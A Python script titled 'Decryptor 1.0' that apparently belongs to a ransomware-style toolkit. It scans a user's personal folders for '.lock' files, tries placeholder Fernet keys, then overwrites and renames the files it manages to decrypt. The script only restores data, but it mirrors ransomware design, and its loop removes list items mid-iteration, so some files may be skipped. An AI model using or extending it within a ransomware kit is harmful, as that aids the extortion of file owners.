from cryptography.fernet import Fernet, InvalidToken
import sys, os, time

_files = []

def _index(_path):
    global _files
    # scrape files recursively in working/sub-directory(s)
    for root, dirs, files in os.walk(_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            # add <path>/<filename>.<file-ext> to list
            if file_path.lower().endswith('.lock'):
                _files.append(file_path)
                
    # remove any line-feeds
    _files = [item.replace("\n", "") for item in _files]

def main():
    global _files
    os.system('clear')
    print('''
  ___                       _             _   __  
 |   \ ___ __ _ _ _  _ _ __| |_ ___ _ _  / | /  \ 
 | |) / -_) _| '_| || | '_ \  _/ _ \ '_| | || () |
 |___/\___\__|_|  \_, | .__/\__\___/_|   |_(_)__/ 
                  |__/|_|                         

 [*] Scanner active!\r\n''')
    time.sleep(3)
    
    _usr = os.getlogin()
    _dir = ['/home/{}/Desktop',
            '/home/{}/Pictures',
            '/home/{}/Documents',
            '/home/{}/Downloads',
            '/home/{}/Music',
            '/home/{}/Videos'
            #'/home/{}'
            #'/'
            ]

    # locate all .lock encrypted files            
    for x in _dir:
        _path = x.format(_usr)
        if os.path.exists(_path):
            print(' Indexing encrypted files @ ' + _path + '...')
            _index(_path)
    
    #encryption key(s) go here
    _keys = [
             'YOUR KEY HERE'.encode(),
             'YOUR KEY HERE'.encode(),
             'YOUR KEY HERE'.encode()
            ]
    
    print('\r\n Statistics: ')
    print('     [*] Total of ' + str(len(_files)) + ' file/s flagged for decrypted.')
    print('     [*] Total of ' + str(len(_keys)) + ' unique encryption key/s required for this opertion.')
    print('     [!] Total of ' + str(len(_keys)) + ' passes required per each key.')
    input('\r\n Ready? Strike <ENTER> to scan...\r\n')
    
    print(' This make take some time. Do NOT abort!...\r\n\r\n')
    time.sleep(3)
    
    i = 0
    # loop through each key
    for _key in _keys:
        i +=1
        print(' ---[ PASS #' + str(i) + ']---\r\n')
        
        # loop through each .lock file in list
        for _targ in _files:
            try:
                # get encrypted file content
                with open(_targ, "rb") as _encrypt:
                    _content = _encrypt.read()
                
                # decrypt content with key
                _content_decrypted = Fernet(_key).decrypt(_content)
                
                # if key successfully decrypted...
                if _content_decrypted != b'':
                    # overwrite file with decrypted content
                    with open(_targ, "wb") as _overwrite:
                        _overwrite.write(_content_decrypted)
                        
                # remove .lock file extension ---> filename = os.path.basename(_targ)
                os.rename(_targ, _targ[:-5])
                
                print(' [+] Successfully decrypted file: ' + _targ)
                _files.remove(_targ)
            except: #InvalidToken:
                pass
            
    sys.exit('\r\n Operation complete!')
    
if __name__ == '__main__':
    main()
